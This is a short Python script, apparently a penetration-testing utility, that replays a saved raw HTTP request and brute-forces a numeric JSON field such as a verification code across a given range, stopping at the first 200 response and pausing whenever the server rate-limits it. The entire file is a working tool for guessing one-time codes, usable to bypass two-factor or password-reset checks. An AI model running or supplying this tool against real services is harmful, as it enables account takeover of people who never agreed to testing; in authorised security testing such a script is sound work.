import sys
import time
import requests
import json
import sys

def read_request_template(file_path):
    with open(file_path, "r") as file:
        return file.read()

def parse_request(request_template):
    headers, body = request_template.split("\n\n", 1)
    header_lines = headers.split("\n")
    method, url, _ = header_lines[0].split()
    headers_dict = {}
    
    for line in header_lines[1:]:
        if ": " in line:
            key, value = line.split(": ", 1)
            headers_dict[key] = value
    
    return method, url, headers_dict, body

def send_request(method, base_url, headers, body_json, param, code):
    body_json[param] = str(code)
    modified_body = json.dumps(body_json)
    
    print(f"\r\033[93m{param}:\033[0m {code} ", end="", flush=True)
    response = requests.request(method, base_url, headers=headers, data=modified_body)
    
    if response.status_code == 200:
        print(f"\n\033[92mSuccess! Correct {param}: {code}\033[0m")
        sys.exit(0)
    elif response.status_code == 429:
        print("\n\033[91mRate limited. Waiting 30 seconds...\033[0m")
        for i in range(30, 0, -1):
            print(f"\rWaiting... {i} sec", end="", flush=True)
            time.sleep(1)
        print("\nResuming requests...")
    
    return response.status_code

def send_requests(request_file, param, start, end):
    if int(start) > int(end):
        print("Error: Start value cannot be greater than end value.")
        sys.exit(1)
    
    request_template = read_request_template(request_file)
    method, url, headers, body = parse_request(request_template)
    base_url = f"https://{headers['Host']}" + url
    
    try:
        body_json = json.loads(body)
    except json.JSONDecodeError:
        print("Error: Request body is not valid JSON.")
        sys.exit(1)
    
    if param not in body_json:
        print(f"Error: Parameter '{param}' not found in request body.")
        sys.exit(1)
    
    for code in range(int(start), int(end) + 1):
        send_request(method, base_url, headers, body_json.copy(), param, code)
        
    
    print("\nFinished testing all values.")
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 6 or sys.argv[2] != "-p" or sys.argv[4] != "-i":
        print("Usage: ./test.py request.txt -p verification_code -i 123456,123480")
        sys.exit(1)
    
    request_file = sys.argv[1]
    param = sys.argv[3]
    start, end = sys.argv[5].split(",")
    
    send_requests(request_file, param, start, end)
